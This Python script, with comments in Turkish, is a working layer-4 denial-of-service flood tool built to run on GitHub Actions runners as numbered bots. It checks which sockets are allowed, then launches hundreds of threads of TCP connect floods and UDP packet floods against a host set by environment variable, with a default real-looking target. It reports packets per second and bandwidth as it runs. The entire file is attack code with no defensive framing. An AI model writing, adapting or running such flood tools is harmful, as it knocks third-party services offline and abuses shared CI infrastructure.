#!/usr/bin/env python3
"""
L4 TCP Connection Flood — GitHub Actions Compatible

Raw socket (SOCK_RAW) bloklu ama normal TCP socket (SOCK_STREAM) acik.
Bu script surekli TCP connection acar ve hemen kapatir:
  - Hedefin TCP stack'ini yorar
  - Connection table'i doldurur
  - SYN-ACK islemesi CPU harcar
  - TIME_WAIT socket'ler birikir

Ayrica UDP (SOCK_DGRAM) normal socket ile denenir — bazi platformlarda calisiyor.

ENV:
  TARGET_HOST  - hedef IP/hostname
  TARGET_PORT  - hedef port (default 80)
  THREADS      - thread sayisi (default 200)
  DURATION     - sure saniye (default 300)
  BOT_ID       - bot numarasi
  MODE         - tcp / udp / mixed (default mixed)
"""

import socket
import threading
import time
import os
import sys
import random
import struct

TARGET_HOST = os.environ.get('TARGET_HOST', '')
TARGET_PORT = int(os.environ.get('TARGET_PORT', '80'))
THREADS = int(os.environ.get('THREADS', '200'))
DURATION = int(os.environ.get('DURATION', '300'))
BOT_ID = os.environ.get('BOT_ID', '0')
MODE = os.environ.get('MODE', 'mixed')

# Hedef URL'den host/port cikart
if not TARGET_HOST:
    target_url = os.environ.get('TARGET_URL', 'https://gorouter.app')
    if '://' in target_url:
        target_url = target_url.split('://')[1]
    if '/' in target_url:
        target_url = target_url.split('/')[0]
    if ':' in target_url:
        parts = target_url.split(':')
        TARGET_HOST = parts[0]
        TARGET_PORT = int(parts[1])
    else:
        TARGET_HOST = target_url

# DNS resolve
try:
    TARGET_IP = socket.gethostbyname(TARGET_HOST)
except:
    TARGET_IP = TARGET_HOST

print(f'=== L4 FLOOD BOT #{BOT_ID} ===')
print(f'Host: {TARGET_HOST} -> {TARGET_IP}')
print(f'Port: {TARGET_PORT}')
print(f'Threads: {THREADS}')
print(f'Duration: {DURATION}s')
print(f'Mode: {MODE}')
print()

# Raw socket testi
print('--- SOCKET CAPABILITY TEST ---')
capabilities = {'raw_udp': False, 'raw_tcp': False, 'udp': False, 'tcp': False}

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    capabilities['raw_udp'] = True
    s.close()
    print('  RAW UDP: ALLOWED')
except:
    print('  RAW UDP: blocked')

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    capabilities['raw_tcp'] = True
    s.close()
    print('  RAW TCP: ALLOWED')
except:
    print('  RAW TCP: blocked')

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(b'\x00' * 64, (TARGET_IP, TARGET_PORT))
    capabilities['udp'] = True
    s.close()
    print('  UDP DGRAM: ALLOWED')
except Exception as e:
    print(f'  UDP DGRAM: {e}')

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect((TARGET_IP, TARGET_PORT))
    capabilities['tcp'] = True
    s.close()
    print('  TCP STREAM: ALLOWED')
except Exception as e:
    print(f'  TCP STREAM: {e}')

print()

# Stats
stats = {
    'tcp_conn': 0, 'tcp_fail': 0,
    'udp_sent': 0, 'udp_fail': 0,
    'bytes_out': 0,
    'start': time.time()
}
lock = threading.Lock()

# Random payload
def random_payload(size=1024):
    return bytes(random.getrandbits(8) for _ in range(size))

# TCP Connection Flood
def tcp_flood_worker():
    """Surekli TCP connection ac + hemen kapat. TIME_WAIT biriktirir."""
    while time.time() - stats['start'] < DURATION:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.connect((TARGET_IP, TARGET_PORT))
            # Kisa random data gonder (optional — bazi hedefler bos baglanti ignore eder)
            payload = random_payload(random.randint(64, 1024))
            s.send(payload)
            with lock:
                stats['tcp_conn'] += 1
                stats['bytes_out'] += len(payload)
            s.close()
        except:
            with lock:
                stats['tcp_fail'] += 1
        # Tiny sleep to avoid local port exhaustion
        time.sleep(random.uniform(0, 0.01))

# UDP Flood
def udp_flood_worker():
    """UDP paket pompalama — raw socket olmadan."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() - stats['start'] < DURATION:
        try:
            payload = random_payload(random.randint(512, 4096))
            s.sendto(payload, (TARGET_IP, TARGET_PORT))
            with lock:
                stats['udp_sent'] += 1
                stats['bytes_out'] += len(payload)
        except:
            with lock:
                stats['udp_fail'] += 1
            # Socket yenile
            try:
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass
    s.close()

# Mixed mode
def mixed_worker():
    """TCP ve UDP karisik."""
    while time.time() - stats['start'] < DURATION:
        if random.random() < 0.6:
            # TCP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
                s.connect((TARGET_IP, TARGET_PORT))
                payload = random_payload(random.randint(64, 1024))
                s.send(payload)
                with lock:
                    stats['tcp_conn'] += 1
                    stats['bytes_out'] += len(payload)
                s.close()
            except:
                with lock:
                    stats['tcp_fail'] += 1
        else:
            # UDP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random_payload(random.randint(512, 4096))
                s.sendto(payload, (TARGET_IP, TARGET_PORT))
                with lock:
                    stats['udp_sent'] += 1
                    stats['bytes_out'] += len(payload)
                s.close()
            except:
                with lock:
                    stats['udp_fail'] += 1

# Worker secimi
worker_fn = {
    'tcp': tcp_flood_worker,
    'udp': udp_flood_worker,
    'mixed': mixed_worker
}.get(MODE, mixed_worker)

# Thread'leri baslat
print(f'--- STARTING {THREADS} {MODE.upper()} THREADS ---')
threads = []
for i in range(THREADS):
    t = threading.Thread(target=worker_fn, daemon=True)
    t.start()
    threads.append(t)

# Progress log (her 5 saniye)
while time.time() - stats['start'] < DURATION:
    elapsed = int(time.time() - stats['start'])
    total = stats['tcp_conn'] + stats['udp_sent']
    total_fail = stats['tcp_fail'] + stats['udp_fail']
    pps = total / max(elapsed, 1)
    mbps = (stats['bytes_out'] * 8 / max(elapsed, 1)) / 1_000_000
    print(f'[LIVE L4 bot={BOT_ID}] t={elapsed}s | tcp={stats["tcp_conn"]} udp={stats["udp_sent"]} | fail={total_fail} | pps={pps:.0f} | {mbps:.1f} Mbps')
    time.sleep(5)

# Final
elapsed = time.time() - stats['start']
total = stats['tcp_conn'] + stats['udp_sent']
total_fail = stats['tcp_fail'] + stats['udp_fail']
pps = total / max(elapsed, 1)
mbps = (stats['bytes_out'] * 8 / max(elapsed, 1)) / 1_000_000

print()
print(f'=== L4 FLOOD SUMMARY BOT #{BOT_ID} ===')
print(f'  Duration      : {elapsed:.0f}s')
print(f'  TCP connects  : {stats["tcp_conn"]}')
print(f'  UDP packets   : {stats["udp_sent"]}')
print(f'  Total packets : {total}')
print(f'  Failed        : {total_fail}')
print(f'  Avg PPS       : {pps:.0f}')
print(f'  Avg Bandwidth : {mbps:.1f} Mbps')
print(f'  Total data    : {stats["bytes_out"] / 1024 / 1024:.1f} MB')